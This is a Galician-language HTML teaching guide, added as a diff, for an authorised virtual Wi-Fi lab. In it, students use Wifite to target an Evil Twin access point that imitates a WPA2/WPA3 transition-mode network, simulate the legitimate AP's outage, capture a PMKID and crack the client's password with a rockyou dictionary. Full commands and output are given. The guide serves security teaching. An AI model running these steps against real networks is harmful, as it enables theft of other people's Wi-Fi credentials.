@@ -1,0 +1,152 @@
+<!doctype html><html lang="gl"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Práctica Wifite 3.3 — WPA3-SAE en modo transición: Evil Twin e auditoría WPA2-PSK</title><style>
+:root{color-scheme:light dark}body{font:16px/1.58 system-ui,Arial;margin:0;background:#f7f9fb;color:#1c2e3d}.wrap{max-width:940px;margin:0 auto;padding:22px 28px 70px}a{color:#1460a0}header{position:sticky;top:0;background:#12334d;color:#fff;padding:12px 26px}header a{color:#fff}article{background:white;border-radius:16px;padding:25px 36px;box-shadow:0 4px 20px #18364f11}h1{font-size:1.7rem;line-height:1.25}h2{font-size:1.35rem;margin-top:2rem;border-bottom:1px solid #d7e0e7;padding-bottom:.4rem}h3{font-size:1.1rem}pre{padding:14px 18px;background:#11283a;color:#e4f5ff;overflow:auto;border-radius:9px;white-space:pre}pre code{font:13px/1.5 ui-monospace,Consolas,monospace}p code,li code{background:#e8eff5;padding:2px 4px;border-radius:4px}table{border-collapse:collapse;display:block;overflow:auto}td,th{border:1px solid #d4e0ea;padding:8px;text-align:left}img{max-width:100%;height:auto}blockquote{border-left:4px solid #14a3b8;padding:2px 12px;background:#eff7f9}.notice{padding:10px 15px;border-left:4px solid #16a5bd;background:#eff9fc;border-radius:6px}.notice.warning{border-color:#db7e26;background:#fff7eb}.notice strong{display:block} @media(max-width:640px){.wrap{padding:12px}article{padding:15px}} </style><header><a href="../index.html">← Volver ao laboratorio interactivo</a> · Guía docente validada</header><main class="wrap"><article><h1>Práctica Wifite 3.3 — WPA3-SAE en modo transición: Evil Twin e auditoría WPA2-PSK</h1>
+<div class="notice warning"><strong>Laboratorio autorizado</strong>
+<p>Esta práctica execútase exclusivamente no laboratorio virtual <code>vuln-wifi.lab</code>, con radios <code>mac80211_hwsim</code> e puntos de acceso creados polo propio escenario. A indispoñibilidade do AP lexítimo <strong>simúlase detendo o seu proceso <code>hostapd</code></strong>; non se realiza un ataque DoS real.</p>
+</div>
+<div class="notice info"><strong>Referencia docente</strong>
+<p><code>3-Taller-HE-Practica-WiFi-3.pdf</code>, especialmente as páxinas 10–18. A <a href="./3.3-ATAQUE_WPA3_DoS_WPA2_EVIL_TWIN.html">práctica 3.3</a> realiza a captura e a auditoría con Aircrack-ng; aquí empregaremos <strong>Wifite</strong> e un directorio de traballo limpo.</p>
+</div>
+<h2>1. Obxectivo</h2>
+<p>Identificar <strong>dous AP co mesmo SSID <code>EMPRESA-XYZ</code></strong>, distinguir o lexítimo do Evil Twin polo seu BSSID e comprobar como a desaparición do AP lexítimo leva o cliente configurado en modo transición a <strong>intentar autenticarse por WPA2-PSK</strong> no Evil Twin. Empregar Wifite para obter material de autenticación e recuperar o contrasinal do cliente mediante dicionario.</p>
+<p>No laboratorio comprobouse a captura dun <strong>PMKID</strong> e a recuperación de <strong><code>spongebob19</code></strong> mediante Wifite. O intento posterior de capturar un <em>4-Way Handshake</em> rematou aos 300 segundos sen éxito. Son dúas fases distintas.</p>
+<h2>2. Topoloxía e material</h2>
+<p>| Terminal | Compoñente | Interface | <em>Namespace</em> |
+|---|---|---|---|
+| <strong>1</strong> | AP lexítimo en modo transición WPA2/WPA3; comprobación do Evil Twin | <code>wlan0</code> / <code>wlan2</code> | <code>phy0_wlan0</code> / <code>evil_twin_wlan2</code> |
+| <strong>2</strong> | Cliente lexítimo que admite SAE e WPA-PSK | <code>wlan1</code> | <code>phy1_wlan1</code> |
+| <strong>3</strong> | Wifite, escaneo e auditoría | <code>wlan3</code> | Global |</p>
+<p>O escenario crea <strong>catro radios virtuais</strong>. Wifite debe traballar con <code>wlan3</code>, sen mover nin deter os dispositivos dos outros <em>namespaces</em>.</p>
+<p>| Elemento | Configuración |
+|---|---|
+| AP lexítimo | <code>EMPRESA-XYZ</code>, <code>WPA-PSK SAE</code>, clave <code>spongebob19</code> |
+| Cliente | <code>EMPRESA-XYZ</code>, admite <code>SAE WPA-PSK</code>, clave <code>spongebob19</code> |
+| Evil Twin | <code>EMPRESA-XYZ</code>, só <code>WPA-PSK</code>, clave <code>calqueracousa</code> |</p>
+<p>O contrasinal <strong>que se pretende descubrir</strong> é <code>spongebob19</code>, o utilizado polo cliente. O Evil Twin emprega deliberadamente outra clave porque o atacante descoñece a verdadeira. Non se debe igualar a clave do AP falso á do cliente.</p>
+<div class="notice note"><strong>PMF e estado da conexión</strong>
+<p>O cliente inicia a práctica conectado ao AP lexítimo <strong>mediante SAE</strong>, con PMF negociado. No BSS de transición <code>ieee80211w=1</code> indica PMF opcional, e <code>sae_require_mfp=1</code> esíxeo para SAE. A protección da asociación SAE anterior non impide que o cliente <strong>tente</strong> autenticarse nun AP que só ofrece WPA2-PSK. Cando as PSK son diferentes, poden producirse asociacións e mensaxes EAPOL sen chegar ao estado <code>wpa_state=COMPLETED</code>. <strong>Asociarse non equivale a completar a autenticación.</strong></p>
+</div>
+<h2>3. Procedemento</h2>
+<h3>3.1. Terminal 1 — Iniciar o escenario</h3>
+<pre><code class="language-bash">sudo wifilabctl up wpa3_sae_vulnerable
+sudo wifilabctl status
+</code></pre>
+<p>Comprobar que os AP están activos e anotar os seus BSSID, que poden cambiar ao reiniciar:</p>
+<pre><code class="language-bash">LAB=/home/kali/wifiLab/run/wpa3_sae_vulnerable
+
+sudo grep -E '^(ssid|channel|wpa_key_mgmt|ieee80211w|sae_require_mfp|wpa_passphrase|sae_password)=' \
+  &quot;$LAB/hostapd.conf&quot;
+sudo grep -E '^(ssid|channel|wpa_key_mgmt|ieee80211w|wpa_passphrase)=' \
+  &quot;$LAB/hostapd_eviltwin.conf&quot;
+
+AP_BSSID=$(sudo ip netns exec phy0_wlan0 iw dev wlan0 info | awk '$1==&quot;addr&quot; {print tolower($2); exit}')
+EVIL_BSSID=$(sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info | awk '$1==&quot;addr&quot; {print tolower($2); exit}')
+printf 'Lexítimo: %s\nEvil Twin: %s\n' &quot;$AP_BSSID&quot; &quot;$EVIL_BSSID&quot;
+</code></pre>
+<h3>3.2. Terminal 2 — Comprobar a conexión SAE inicial</h3>
+<pre><code class="language-bash">sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status
+</code></pre>
+<p>Comprobar <code>key_mgmt=SAE</code>, <code>wpa_state=COMPLETED</code> e que <code>bssid=</code> coincide co AP lexítimo. É o estado <strong>anterior</strong> á caída simulada do AP.</p>
+<h3>3.3. Terminal 3 — Preparar Wifite sen reutilizar capturas</h3>
+<p>Crear un directorio novo para a proba. Así non dependemos de <code>hs/</code>, <code>cracked.json</code> nin resultados de prácticas anteriores:</p>
+<pre><code class="language-bash">DIR=&quot;$HOME/proba-wifite-3.3-$(date +%Y%m%d-%H%M%S)&quot;
+mkdir -p &quot;$DIR&quot;
+cd &quot;$DIR&quot;
+pwd
+ls -la
+</code></pre>
+<p>Comprobar que existe o dicionario:</p>
+<pre><code class="language-bash">ls -lh /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p>Se só existe <code>rockyou.txt.gz</code>, descomprimilo unha vez:</p>
+<pre><code class="language-bash">sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
+</code></pre>
+<p><strong>Iniciar Wifite sen o filtro <code>--wpa</code> nin <code>--wpa3</code></strong>, para ver simultaneamente os AP clasificados como <code>WPA3-S</code> e <code>WPA2-P</code>:</p>
+<pre><code class="language-bash">sudo wifite -i wlan3 -c 6 --showb --no-wps \
+  --new-hs --dict /usr/share/wordlists/rockyou.txt \
+  --hs-dir &quot;$PWD/hs&quot; --wpat 300
+</code></pre>
+<p><code>--showb</code> permite identificar os AP por BSSID; <code>--new-hs</code> evita reutilizar capturas anteriores e <code>--hs-dir</code> sitúa as novas capturas neste directorio. Non usar <code>airmon-ng check kill</code>, <code>wifite --kill</code> nin <code>wifilabctl down</code>: poderían interromper os servizos do escenario.</p>
+<h3>3.4. Terminal 3 — Identificar os dous AP e seleccionar o Evil Twin</h3>
+<p>Na listaxe inicial de Wifite deben aparecer <strong>dous AP co SSID <code>EMPRESA-XYZ</code></strong>, pero con <strong>BSSID diferentes</strong>:</p>
+<pre><code class="language-text">NUM    ESSID          BSSID               CH   ENCR
+1      EMPRESA-XYZ    &lt;BSSID_LEXITIMO&gt;    6    WPA3-S
+2      EMPRESA-XYZ    &lt;BSSID_EVIL_TWIN&gt;   6    WPA2-P
+</code></pre>
+<p>Os números son ilustrativos: Wifite pode ordenar os AP de maneira diferente. Comparar os BSSID cos obtidos na terminal 1.</p>
+<ol>
+<li><strong>Premer <code>Ctrl+C</code> unha soa vez</strong> para rematar o escaneo e acceder a <code>Select target(s)</code>; non se sae de Wifite.</li>
+<li><strong>Seleccionar o número correspondente ao BSSID do Evil Twin (<code>WPA2-P</code>)</strong> e premer Intro. Non seleccionar o AP SAE lexítimo.</li>
+<li><strong>Deixar Wifite traballando</strong>. Comezará os seus intentos de obtención de material WPA2, incluída a fase PMKID, e pode continuar despois coa captura dun <em>handshake</em>.</li>
+</ol>
+<h3>3.5. Terminal 1 — Simular a caída do AP lexítimo</h3>
+<p>Unha vez seleccionado o Evil Twin en Wifite, deter <strong>só</strong> o <code>hostapd</code> pertencente ao AP lexítimo:</p>
+<pre><code class="language-bash">for pid in $(sudo ip netns pids phy0_wlan0); do
+    if [ &quot;$(cat /proc/&quot;$pid&quot;/comm 2&gt;/dev/null)&quot; = 'hostapd' ]; then
+        echo &quot;Detendo AP lexítimo: PID=$pid&quot;
+        sudo kill -TERM &quot;$pid&quot;
+    fi
+done
+</code></pre>
+<p>O Evil Twin debe seguir activo:</p>
+<pre><code class="language-bash">sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info
+sudo grep 'AP-ENABLED' &quot;$LAB/hostapd_eviltwin.log&quot;
+</code></pre>
+<p>A caída é unha <strong>simulación controlada</strong>, non unha explotación real de Dragondrain nin unha función de Wifite.</p>
+<h3>3.6. Terminal 2 — Comprobar a tentativa de conexión ao Evil Twin</h3>
+<p>Co AP lexítimo detido e o Evil Twin dispoñible, provocar unha nova selección de rede:</p>
+<pre><code class="language-bash">sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 disconnect
+sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 pmksa_flush
+sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 reconnect
+
+sleep 8
+sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status
+sudo ip netns exec phy1_wlan1 iw dev wlan1 link
+</code></pre>
+<p>Comprobar nos logs do AP falso os intentos de autenticación ou asociación:</p>
+<pre><code class="language-bash">sudo grep -E 'authenticated|associated|POSSIBLE-PSK-MISMATCH|EAPOL|deauthenticated' \
+  /home/kali/wifiLab/run/wpa3_sae_vulnerable/hostapd_eviltwin.log | tail -n 50
+</code></pre>
+<p>Co AP lexítimo fóra de servizo, o cliente configurado con <code>SAE WPA-PSK</code> pode <strong>seleccionar e intentar asociarse ao Evil Twin WPA2-PSK</strong>. Debido á diferenza de contrasinais, non se debe dar por suposto que a conexión remate en <code>COMPLETED</code>. Para a auditoría abonda con que Wifite obteña material criptográfico verificable.</p>
+<h3>3.7. Terminal 3 — Capturar PMKID e recuperar o contrasinal</h3>
+<p>Deixar que Wifite complete os intentos sobre o Evil Twin seleccionado. Na <strong>proba realizada desde un directorio novo</strong>, o resultado observado foi:</p>
+<pre><code class="language-text">(1/1) Starting attacks against C6:0F:2D:91:B6:83 (EMPRESA-XYZ)
+EMPRESA-XYZ (72db) PMKID CAPTURE: Captured PMKID
+EMPRESA-XYZ (72db) PMKID CRACK: Cracking PMKID using /usr/share/wordlists/rockyou.txt ...
+EMPRESA-XYZ (72db) PMKID CRACKED: Key: spongebob19
+
+Access Point Name: EMPRESA-XYZ
+Access Point BSSID: C6:0F:2D:91:B6:83
+Encryption: PMKID
+PSK (password): spongebob19
+</code></pre>
+<p><strong>Este é o resultado conseguido na práctica: Wifite recuperou <code>spongebob19</code> mediante PMKID</strong> sen reutilizar as capturas das prácticas anteriores. O BSSID do exemplo é o desa execución e pode ser diferente ao reiniciar o escenario.</p>
+<p>Wifite proseguiu coa captura dun <em>handshake</em> WPA2, pero esa segunda fase rematou así:</p>
+<pre><code class="language-text">EMPRESA-XYZ (72db) WPA handshake capture FAILED: Timed out after 300 seconds
+Finished attacking 1 target(s), exiting
+</code></pre>
+<p><strong>Non hai contradición:</strong> recuperouse a clave mediante PMKID, aínda que Wifite non obtivese posteriormente un <em>handshake</em> que aceptase como válido. A práctica manual 3.3 conseguiu tamén recuperar <code>spongebob19</code>, pero mediante captura EAPOL e Aircrack-ng.</p>
+<h3>3.8. Verificar os resultados gardados</h3>
+<p>Desde o directorio no que se iniciou Wifite:</p>
+<pre><code class="language-bash">pwd
+find &quot;$PWD/hs&quot; -maxdepth 2 -type f -print 2&gt;/dev/null
+sudo wifite --cracked
+</code></pre>
+<div class="notice note"><strong>Interpretación correcta</strong>
+<p>A secuencia didáctica é: <strong>dous AP visibles → seleccionar o Evil Twin polo BSSID → simular a caída do AP lexítimo → observar a tentativa WPA2 do cliente → capturar o PMKID → recuperar <code>spongebob19</code></strong>. A pantalla de Wifite confirma a recuperación da clave sobre o BSSID seleccionado, pero, sen examinar a traza temporal e o PMKID, non demostra por si soa en que instante se xerou ese PMKID nin que a caída do AP fose imprescindible para capturalo. A ferramenta non realiza por si soa un ataque de <em>downgrade</em> nin rompe directamente SAE.</p>
+</div>
+<h2>4. Resultado da práctica</h2>
+<p>| Comprobación | Resultado |
+|---|---|
+| Dous AP co mesmo SSID | <strong>Observados:</strong> <code>WPA3-S</code> e <code>WPA2-P</code>, con BSSID diferentes |
+| AP lexítimo detido | Caída simulada de <code>hostapd</code>; Evil Twin permanece dispoñible |
+| Cliente | Tentativa de autenticación WPA2 no Evil Twin tras a desaparición do lexítimo |
+| Captura do PMKID con Wifite | <strong>Conseguida</strong> nun directorio novo |
+| Recuperación por dicionario | <strong>Conseguida:</strong> <code>PMKID CRACKED: Key: spongebob19</code> |
+| Captura posterior do <em>4-Way Handshake</em> con Wifite | <strong>Non conseguida:</strong> tempo esgotado aos 300 s |</p>
+<p><strong>Conclusión:</strong> a práctica Wifite 3.3 permite observar o risco do modo transición WPA2/WPA3: un cliente que admite SAE tamén pode tentar autenticarse mediante WPA2-PSK ante un AP co mesmo SSID. No laboratorio, <strong>Wifite recuperou <code>spongebob19</code> a partir dun PMKID</strong>; non se explotou directamente WPA3-SAE, nin se completou a captura posterior do <em>handshake</em> con Wifite.</p>
+<h2>5. Restaurar o laboratorio</h2>
+<pre><code class="language-bash">sudo wifilabctl up wpa3_sae_vulnerable
+sudo wifilabctl status
+</code></pre>
+<p><strong>Referencias:</strong> <a href="./3.3-ATAQUE_WPA3_DoS_WPA2_EVIL_TWIN.html">Práctica manual 3.3</a> · <a href="https://github.com/derv82/wifite2">Wifite2</a>.</p>
+</article><p>Fonte: Markdown orixinal de <code>20261121_docs.he-ud2.zip</code>. O procedemento debe executarse exclusivamente no laboratorio docente autorizado.</p></main></html>
